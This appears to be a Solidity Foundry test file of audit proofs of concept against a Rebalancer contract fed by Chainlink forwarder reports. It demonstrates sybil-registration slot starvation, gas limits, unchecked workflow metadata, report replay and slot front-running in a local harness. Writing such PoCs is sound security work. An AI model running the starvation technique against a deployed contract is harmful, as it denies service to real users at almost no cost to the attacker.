// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {RebalancerTestBase} from "repo/test/Rebalancer.t.sol";
import {Rebalancer} from "repo/src/Rebalancer.sol";

contract CrePoC is RebalancerTestBase {
    function _meta(bytes32 wfId, address wfOwner) internal pure returns (bytes memory) {
        // 64 bytes, as KeystoneForwarder rawReport[45:109] delivers
        return abi.encodePacked(wfId, bytes10("whatever"), wfOwner, bytes2(0x0001));
    }

    /// PoC-1: slot starvation. 6 owners, "sybil" 1-5 register first with dust params (band 1 bps, cap 1 bps,
    /// minTrade 1, interval 1 hour). The workflow takes dueOwners(0,50)[:5]; owner 6 never gets a turn.
    function test_poc_starvationByRegistrationOrder() public {
        Rebalancer.Params memory dust = Rebalancer.Params({
            active: true, targetBps: 8000, bandBps: 1, maxCorrectionBps: 1, minTradeEurc: 1, interval: 1 hours, maxSlippageBps: 100
        });
        address[5] memory sybil;
        for (uint256 i = 0; i < 5; i++) {
            sybil[i] = makeAddr(string(abi.encodePacked("sybil", i)));
            _setUser(sybil[i], 1000e6, 0, dust); // 100% EURC, target 80%: drift 80% >> band, trade = 1 bps of 1000 = 0.1 EURC
        }
        _setUser(alice, 1000e6, 0, _defaultParams()); // real user, registers sixth

        _hour(START + 1, sybil);
        _hour(START + 1 hours + 1, sybil);
        _hour(START + 2 hours + 1, sybil);
        // Cost to the attacker: 5 x 0.1 EURC moved per hour at 25 bps fee = 0.00125 EURC/hour.
        emit log_named_uint("treasury fee after 15 dust runs (EURC base units)", eurc.balanceOf(treasury));
        assertLt(eurc.balanceOf(treasury), 5_000, "fee does not cover the CRE gas cost");
    }

    function _hour(uint256 ts, address[5] memory sybil) internal {
        vm.warp(ts);
        _setPrice(PRICE); // keep feeds fresh (heartbeat), as on mainnet
        address[] memory due = r.dueOwners(0, 50);
        emit log_named_uint("ts", ts);
        emit log_named_uint("  due.length", due.length);
        assertEq(due.length, 6, "all six are due");
        address[] memory report = new address[](5);
        for (uint256 i = 0; i < 5; i++) report[i] = due[i];
        vm.prank(forwarder);
        r.onReport(_meta(bytes32(uint256(1)), workflowOwner), abi.encode(report));
        for (uint256 i = 0; i < 5; i++) assertEq(uint256(r.lastExecutedAt(sybil[i])), ts, "sybil served");
        assertEq(r.lastExecutedAt(alice), 0, "alice is never served via CRE");
    }

    /// PoC-2: 5 owners that each use (almost) the full EXECUTE_GAS fit in ~3.7M gas.
    function test_poc_fiveFullBudgetOwnersFit() public {
        uint256[6] memory burns = [uint256(0), 100_000, 150_000, 200_000, 225_000, 250_000];
        for (uint256 b = 0; b < burns.length; b++) {
            uint256 snap = vm.snapshotState();
            router.setGasBurn(burns[b]);
            address[] memory list = new address[](5);
            for (uint256 i = 0; i < 5; i++) {
                list[i] = makeAddr(string(abi.encodePacked("g", i)));
                _setUser(list[i], 1000e6, 0, _defaultParams());
            }
            uint256 g0 = gasleft();
            vm.prank(forwarder);
            r.onReport{gas: 3_700_000}(_meta(bytes32(uint256(1)), workflowOwner), abi.encode(list));
            uint256 used = g0 - gasleft();
            uint256 executed;
            for (uint256 i = 0; i < 5; i++) if (r.lastExecutedAt(list[i]) != 0) executed++;
            emit log_named_uint("burn", burns[b]);
            emit log_named_uint("  executed out of 5 (3.7M gas)", executed);
            emit log_named_uint("  onReport gas used", used);
            vm.revertToState(snap);
        }
    }

    /// PoC-3: metadata shorter than 62 bytes makes the whole call revert (no try/catch there); 64 bytes from the
    /// forwarder is simply accepted; workflowId and name are not checked.
    function test_poc_metadataHandling() public {
        _setUser(alice, 1000e6, 0, _defaultParams());
        address[] memory list = new address[](1);
        list[0] = alice;
        vm.prank(forwarder);
        vm.expectRevert();
        r.onReport(hex"00", abi.encode(list));
        vm.prank(forwarder);
        r.onReport(_meta(keccak256("other-workflow-same-owner"), workflowOwner), abi.encode(list));
        assertEq(r.lastExecutedAt(alice), uint64(START));
    }

    /// PoC-4: replaying the same report is harmless at contract level (NotDue).
    function test_poc_replayIsIdempotent() public {
        _setUser(alice, 1000e6, 0, _defaultParams());
        address[] memory list = new address[](1);
        list[0] = alice;
        bytes memory report = abi.encode(list);
        vm.prank(forwarder);
        r.onReport(_meta(bytes32(uint256(1)), workflowOwner), report);
        uint256 bal = eurc.balanceOf(alice);
        vm.expectEmit(true, false, false, true, address(r));
        emit Rebalancer.ReportSkipped(alice, abi.encodeWithSelector(Rebalancer.NotDue.selector));
        vm.prank(forwarder);
        r.onReport(_meta(bytes32(uint256(1)), workflowOwner), report);
        assertEq(eurc.balanceOf(alice), bal);
    }

    /// PoC-5: an owner who calls execute himself just before the report (or via a third party) steals the slot;
    /// the report skips him with NotDue. Harmless for funds, but wastes one of the 5 slots.
    function test_poc_frontrunSlot() public {
        _setUser(alice, 1000e6, 0, _defaultParams());
        r.execute(alice, bob);
        address[] memory list = new address[](1);
        list[0] = alice;
        vm.expectEmit(true, false, false, true, address(r));
        emit Rebalancer.ReportSkipped(alice, abi.encodeWithSelector(Rebalancer.NotDue.selector));
        vm.prank(forwarder);
        r.onReport(_meta(bytes32(uint256(1)), workflowOwner), abi.encode(list));
        assertEq(eurc.balanceOf(bob), 50_000);
    }
}
